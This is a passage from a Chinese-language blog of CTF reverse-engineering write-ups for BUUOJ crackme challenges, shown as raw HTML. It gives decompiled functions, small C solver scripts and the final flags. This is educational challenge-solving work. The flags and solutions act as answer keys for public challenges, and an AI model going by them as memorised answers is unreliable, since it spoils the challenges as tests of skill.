class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int check[16]&#x3D;&#123;81,115,119,51,115,106,95,108,122,52,95,85,106,119,64,108&#125;;</span><br><span class="line">int i,j,k;</span><br><span class="line">    for ( i &#x3D; 0; i &lt; 16; i++ )</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;127;j++)</span><br><span class="line">        &#123;</span><br><span class="line">        k&#x3D;j;</span><br><span class="line">            if ( j &gt; 64 &amp;&amp; j &lt;&#x3D; 90 )</span><br><span class="line">                j &#x3D; (j - 51) % 26 + 65;</span><br><span class="line">            if ( j &gt; 96 &amp;&amp; j &lt;&#x3D; 122 )</span><br><span class="line">                j &#x3D; (j - 79) % 26 + 97;</span><br><span class="line">            if(j&#x3D;&#x3D;check[i])</span><br><span class="line">                printf(&quot;%c&quot;,k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{Cae3ar_th4_Gre@t}</p></blockquote><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><p><a href="https://buuoj.cn/challenges#[GUET-CTF2019]re">题目链接</a><br>文件包有upx壳，脱掉。<br>进入main函数，然后跳至sub_4009AE，a1为flag，算出来就行，第七位没有，手动爆破。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall sub_4009AE(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  if ( 1629056 * *a1 !&#x3D; 166163712 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 6771600 * a1[1] !&#x3D; 731332800 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 3682944 * a1[2] !&#x3D; 357245568 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 10431000 * a1[3] !&#x3D; 1074393000 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 3977328 * a1[4] !&#x3D; 489211344 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 5138336 * a1[5] !&#x3D; 518971936 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 7532250 * a1[7] !&#x3D; 406741500 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 5551632 * a1[8] !&#x3D; 294236496 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 3409728 * a1[9] !&#x3D; 177305856 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 13013670 * a1[10] !&#x3D; 650683500 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 6088797 * a1[11] !&#x3D; 298351053 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 7884663 * a1[12] !&#x3D; 386348487 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 8944053 * a1[13] !&#x3D; 438258597 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 5198490 * a1[14] !&#x3D; 249527520 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 4544518 * a1[15] !&#x3D; 445362764 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 3645600 * a1[17] !&#x3D; 174988800 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 10115280 * a1[16] !&#x3D; 981182160 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 9667504 * a1[18] !&#x3D; 493042704 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 5364450 * a1[19] !&#x3D; 257493600 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 13464540 * a1[20] !&#x3D; 767478780 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 5488432 * a1[21] !&#x3D; 312840624 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 14479500 * a1[22] !&#x3D; 1404511500 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 6451830 * a1[23] !&#x3D; 316139670 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 6252576 * a1[24] !&#x3D; 619005024 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 7763364 * a1[25] !&#x3D; 372641472 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 7327320 * a1[26] !&#x3D; 373693320 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 8741520 * a1[27] !&#x3D; 498266640 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 8871876 * a1[28] !&#x3D; 452465676 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 4086720 * a1[29] !&#x3D; 208422720 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( 9374400 * a1[30] &#x3D;&#x3D; 515592000 )</span><br><span class="line">    return 5759124 * a1[31] &#x3D;&#x3D; 719890500;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{e165421110ba03099a1c039337}</p></blockquote><h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p><a href="https://buuoj.cn/challenges#[WUSTCTF2020]level1">题目链接</a><br>ida64打开<br>找到main函数，这里逻辑很清晰，直接上脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a1[19]&#x3D;&#123;198,232,816,200,1536,300,6144,984,51200,570,92160,1200,565248,756,1474560,800</span><br><span class="line">    6291456,1782,65536000&#125;;</span><br><span class="line">int i;</span><br><span class="line">for(i&#x3D;0;i&lt;19;i++)</span><br><span class="line">&#123;</span><br><span class="line">if ( (i+1) &amp; 1 )</span><br><span class="line">            printf(&quot;%c&quot;, (a1[i] &gt;&gt; (i+1) ) );</span><br><span class="line">        else</span><br><span class="line">            printf(&quot;%c&quot;, (a1[i]&#x2F;(i+1) ) );</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{d9-dE6-20c}</p></blockquote><h1 id="xxor"><a href="#xxor" class="headerlink" title="xxor"></a>xxor</h1><p>ida64打开<br>进入main函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; &#x2F;&#x2F; [rsp+8h] [rbp-68h]</span><br><span class="line">  signed int j; &#x2F;&#x2F; [rsp+Ch] [rbp-64h]</span><br><span class="line">  __int64 v6; &#x2F;&#x2F; [rsp+10h] [rbp-60h]</span><br><span class="line">  __int64 v7; &#x2F;&#x2F; [rsp+18h] [rbp-58h]</span><br><span class="line">  __int64 v8; &#x2F;&#x2F; [rsp+20h] [rbp-50h]</span><br><span class="line">  __int64 v9; &#x2F;&#x2F; [rsp+28h] [rbp-48h]</span><br><span class="line">  __int64 v10; &#x2F;&#x2F; [rsp+30h] [rbp-40h]</span><br><span class="line">  __int64 v11; &#x2F;&#x2F; [rsp+40h] [rbp-30h]</span><br><span class="line">  __int64 v12; &#x2F;&#x2F; [rsp+48h] [rbp-28h]</span><br><span class="line">  __int64 v13; &#x2F;&#x2F; [rsp+50h] [rbp-20h]</span><br><span class="line">  __int64 v14; &#x2F;&#x2F; [rsp+58h] [rbp-18h]</span><br><span class="line">  __int64 v15; &#x2F;&#x2F; [rsp+60h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v16; &#x2F;&#x2F; [rsp+68h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v16 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;Let us play a game?&quot;);</span><br><span class="line">  puts(&quot;you have six chances to input&quot;);</span><br><span class="line">  puts(&quot;Come on!&quot;);</span><br><span class="line">  v6 &#x3D; 0LL;</span><br><span class="line">  v7 &#x3D; 0LL;</span><br><span class="line">  v8 &#x3D; 0LL;</span><br><span class="line">  v9 &#x3D; 0LL;</span><br><span class="line">  v10 &#x3D; 0LL;</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;%s&quot;, &quot;input: &quot;, i);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v6 + 4 * i);</span><br><span class="line">  &#125;</span><br><span class="line">  v11 &#x3D; 0LL;</span><br><span class="line">  v12 &#x3D; 0LL;</span><br><span class="line">  v13 &#x3D; 0LL;</span><br><span class="line">  v14 &#x3D; 0LL;</span><br><span class="line">  v15 &#x3D; 0LL;</span><br><span class="line">  for ( j &#x3D; 0; j &lt;&#x3D; 4; j +&#x3D; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_601078 &#x3D; *(&amp;v6 + j);</span><br><span class="line">    dword_60107C &#x3D; *(&amp;v6 + j + 1);</span><br><span class="line">    sub_400686(&amp;dword_601078, &amp;unk_601060);</span><br><span class="line">    *(&amp;v11 + j) &#x3D; dword_601078;</span><br><span class="line">    *(&amp;v11 + j + 1) &#x3D; dword_60107C;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( sub_400770(&amp;v11) !&#x3D; 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;NO NO NO~ &quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Congratulation!\n&quot;);</span><br><span class="line">  puts(&quot;You seccess half\n&quot;);</span><br><span class="line">  puts(&quot;Do not forget to change input to hex and combine~\n&quot;);</span><br><span class="line">  puts(&quot;ByeBye&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题分为两步，我们从下往上分析。</p><h2 id="sub-400770"><a href="#sub-400770" class="headerlink" title="sub_400770"></a>sub_400770</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall sub_400770(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; &#x2F;&#x2F; rax</span><br><span class="line"></span><br><span class="line">  if ( a1[2] - a1[3] !&#x3D; 2225223423LL || a1[3] + a1[4] !&#x3D; 4201428739LL || a1[2] - a1[4] !&#x3D; </span><br><span class="line">    1121399208LL )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wrong!&quot;);</span><br><span class="line">    result &#x3D; 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( *a1 !&#x3D; -548868226 || a1[5] !&#x3D; -2064448480 || a1[1] !&#x3D; 550153460 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wrong!&quot;);</span><br><span class="line">    result &#x3D; 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;good!&quot;);</span><br><span class="line">    result &#x3D; 1LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数简单，计算方程组就行。</p><blockquote><p>a1[2] - a1[3] == 2225223423<br>a1[3] + a1[4] == 4201428739<br>a1[2] - a1[4] == 1121399208<br>结果：a1[2]3774025685  a1[3]=1548802262  a1[4]=2652626477</p></blockquote><h2 id="sub-400686"><a href="#sub-400686" class="headerlink" title="sub_400686"></a>sub_400686</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_400686(unsigned int *a1, _DWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; &#x2F;&#x2F; rax</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [rsp+1Ch] [rbp-24h]</span><br><span class="line">  unsigned int v4; &#x2F;&#x2F; [rsp+20h] [rbp-20h]</span><br><span class="line">  int v5; &#x2F;&#x2F; [rsp+24h] [rbp-1Ch]</span><br><span class="line">  unsigned int i; &#x2F;&#x2F; [rsp+28h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; *a1;</span><br><span class="line">  v4 &#x3D; a1[1];</span><br><span class="line">  v5 &#x3D; 0;</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 0x3F; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 +&#x3D; 1166789954;</span><br><span class="line">    v3 +&#x3D; (v4 + v5 + 11) ^ ((v4 &lt;&lt; 6) + *a2) ^ ((v4 &gt;&gt; 9) + a2[1]) ^ 0x20;</span><br><span class="line">    v4 +&#x3D; (v3 + v5 + 20) ^ ((v3 &lt;&lt; 6) + a2[2]) ^ ((v3 &gt;&gt; 9) + a2[3]) ^ 0x10;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 &#x3D; v3;</span><br><span class="line">  result &#x3D; v4;</span><br><span class="line">  a1[1] &#x3D; v4;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a1为flag，a[2]={2,2,3,4}<br>这个函数就是进行异或操作，我们将它逆过来。<br>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int a[6]&#x3D;&#123;3746099070,550153460,3774025685,1548802262,2652626477,2230518816 &#125;;</span><br><span class="line">    unsigned int b[4]&#x3D;&#123;2,2,3,4&#125;;</span><br><span class="line">    unsigned int v3, v4,v5;</span><br><span class="line">    int i;</span><br><span class="line">    for ( i &#x3D; 0; i &lt;&#x3D; 4; i +&#x3D; 2)</span><br><span class="line">    &#123;</span><br><span class="line">        v3 &#x3D; a[i];</span><br><span class="line">        v4 &#x3D; a[i + 1];</span><br><span class="line">        v5 &#x3D; 1166789954*0x40;</span><br><span class="line">        for (int i &#x3D; 0; i &lt;&#x3D; 0x3F; ++i) &#123;</span><br><span class="line">            v4 -&#x3D; (v3 + v5 + 20) ^ ((v3 &lt;&lt; 6) + b[2]) ^ ((v3 &gt;&gt; 9) + b[3]) ^ 0x10;</span><br><span class="line">            v3 -&#x3D; (v4 + v5 + 11) ^ ((v4 &lt;&lt; 6) + b[0]) ^ ((v4 &gt;&gt; 9) + b[1]) ^ 0x20;</span><br><span class="line">            v5 -&#x3D; 1166789954;</span><br><span class="line">        &#125;</span><br><span class="line">        a[i] &#x3D; v3;</span><br><span class="line">        a[i + 1] &#x3D; v4;</span><br><span class="line">    &#125;</span><br><span class="line">    for (i&#x3D;0;i&lt;6;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%0x&quot;,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出的十六进制再转为字符串。</p><blockquote><p>flag{re_is_great!}</p></blockquote><h1 id="Challenge1"><a href="#Challenge1" class="headerlink" title="Challenge1"></a>Challenge1</h1><p>ida32打开，进入main函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char Buffer; &#x2F;&#x2F; [esp+0h] [ebp-94h]</span><br><span class="line">  char *v5; &#x2F;&#x2F; [esp+80h] [ebp-14h]</span><br><span class="line">  char *v6; &#x2F;&#x2F; [esp+84h] [ebp-10h]</span><br><span class="line">  HANDLE v7; &#x2F;&#x2F; [esp+88h] [ebp-Ch]</span><br><span class="line">  HANDLE hFile; &#x2F;&#x2F; [esp+8Ch] [ebp-8h]</span><br><span class="line">  DWORD NumberOfBytesWritten; &#x2F;&#x2F; [esp+90h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  hFile &#x3D; GetStdHandle(0xFFFFFFF5);</span><br><span class="line">  v7 &#x3D; GetStdHandle(0xFFFFFFF6);</span><br><span class="line">  v6 &#x3D; &quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;;</span><br><span class="line">  WriteFile(hFile, &quot;Enter password:\r\n&quot;, 0x12u, &amp;NumberOfBytesWritten, 0);</span><br><span class="line">  ReadFile(v7, &amp;Buffer, 0x80u, &amp;NumberOfBytesWritten, 0);</span><br><span class="line">  v5 &#x3D; sub_401260(&amp;Buffer, NumberOfBytesWritten - 2);</span><br><span class="line">  if ( !strcmp(v5, v6) )</span><br><span class="line">    WriteFile(hFile, &quot;Correct!\r\n&quot;, 0xBu, &amp;NumberOfBytesWritten, 0);</span><br><span class="line">  else</span><br><span class="line">    WriteFile(hFile, &quot;Wrong password\r\n&quot;, 0x11u, &amp;NumberOfBytesWritten, 0);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入第15行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__cdecl sub_401260(int a1, unsigned int a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; ST24_4</span><br><span class="line">  int v4; &#x2F;&#x2F; ST2C_4</span><br><span class="line">  int v5; &#x2F;&#x2F; [esp+Ch] [ebp-24h]</span><br><span class="line">  int v6; &#x2F;&#x2F; [esp+10h] [ebp-20h]</span><br><span class="line">  int v7; &#x2F;&#x2F; [esp+14h] [ebp-1Ch]</span><br><span class="line">  int i; &#x2F;&#x2F; [esp+1Ch] [ebp-14h]</span><br><span class="line">  _BYTE *v9; &#x2F;&#x2F; [esp+24h] [ebp-Ch]</span><br><span class="line">  int v10; &#x2F;&#x2F; [esp+28h] [ebp-8h]</span><br><span class="line">  unsigned int v11; &#x2F;&#x2F; [esp+2Ch] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v9 &#x3D; malloc(4 * ((a2 + 2) &#x2F; 3) + 1);</span><br><span class="line">  if ( !v9 )</span><br><span class="line">    return 0;</span><br><span class="line">  v11 &#x3D; 0;</span><br><span class="line">  v10 &#x3D; 0;</span><br><span class="line">  while ( v11 &lt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v11 &gt;&#x3D; a2 )</span><br><span class="line">      v7 &#x3D; 0;</span><br><span class="line">    else</span><br><span class="line">      v7 &#x3D; *(v11++ + a1);</span><br><span class="line">    if ( v11 &gt;&#x3D; a2 )</span><br><span class="line">      v6 &#x3D; 0;</span><br><span class="line">    else</span><br><span class="line">      v6 &#x3D; *(v11++ + a1);</span><br><span class="line">    if ( v11 &gt;&#x3D; a2 )</span><br><span class="line">      v5 &#x3D; 0;</span><br><span class="line">    else</span><br><span class="line">      v5 &#x3D; *(v11++ + a1);</span><br><span class="line">    v3 &#x3D; v5 + (v7 &lt;&lt; 16) + (v6 &lt;&lt; 8);</span><br><span class="line">    v9[v10] &#x3D; byte_413000[(v3 &gt;&gt; 18) &amp; 0x3F];</span><br><span class="line">    v4 &#x3D; v10 + 1;</span><br><span class="line">    v9[v4++] &#x3D; byte_413000[(v3 &gt;&gt; 12) &amp; 0x3F];</span><br><span class="line">    v9[v4++] &#x3D; byte_413000[(v3 &gt;&gt; 6) &amp; 0x3F];</span><br><span class="line">    v9[v4] &#x3D; byte_413000[v5 &amp; 0x3F];</span><br><span class="line">    v10 &#x3D; v4 + 1;</span><br><span class="line">  &#125;</span><br><span class="line">  for ( i &#x3D; 0; i &lt; dword_413040[a2 % 3]; ++i )</span><br><span class="line">    v9[4 * ((a2 + 2) &#x2F; 3) - i - 1] &#x3D; 61;</span><br><span class="line">  v9[4 * ((a2 + 2) &#x2F; 3)] &#x3D; 0;</span><br><span class="line">  return v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再字符串中有：ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/<br>很明显的base64加密，但密码表变了，根据密码表的变化，将密文转换成正常的base64.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">char flag[52]&#x3D;&quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;;</span><br><span class="line">for(i&#x3D;0;i&lt;52;i++)</span><br><span class="line">&#123;</span><br><span class="line">if ((flag[i]&lt;&#x3D;&#39;W&#39;&amp;&amp;flag[i]&gt;&#x3D;&#39;A&#39;)||(flag[i]&lt;&#x3D;&#39;w&#39;&amp;&amp;flag[i]&gt;&#x3D;&#39;a&#39;))</span><br><span class="line">    flag[i]+&#x3D;3;  </span><br><span class="line">        else if (flag[i] &#x3D;&#x3D; &#39;X&#39;)</span><br><span class="line">         flag[i] &#x3D; &#39;C&#39;;</span><br><span class="line">        else if (flag[i] &#x3D;&#x3D; &#39;Y&#39;)</span><br><span class="line">         flag[i] &#x3D; &#39;B&#39;;</span><br><span class="line">        else if (flag[i] &#x3D;&#x3D; &#39;Z&#39;)</span><br><span class="line">         flag[i] &#x3D; &#39;A&#39;;</span><br><span class="line">        else if (flag[i] &#x3D;&#x3D; &#39;x&#39;)</span><br><span class="line">         flag[i] &#x3D; &#39;c&#39;;</span><br><span class="line">        else if (flag[i] &#x3D;&#x3D; &#39;y&#39;)</span><br><span class="line">         flag[i] &#x3D; &#39;b&#39;;</span><br><span class="line">        else if (flag[i] &#x3D;&#x3D; &#39;z&#39;)</span><br><span class="line">         flag[i] &#x3D; &#39;a&#39;;</span><br><span class="line">        else if (flag[i]&gt;&#x3D;0&amp;&amp;flag[i]&lt;&#x3D;9)</span><br><span class="line">         flag[i] &#x3D; i;</span><br><span class="line">         printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出base64解码就行。</p><blockquote><p>flag{sh00ting_phish_in_a_barrel@flare-on.com}</p></blockquote><h1 id="Universe-final-answer"><a href="#Universe-final-answer" class="headerlink" title="Universe_final_answer"></a>Universe_final_answer</h1><p>ida64打开<br>进入main函数，然后跳转至本题的关键函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 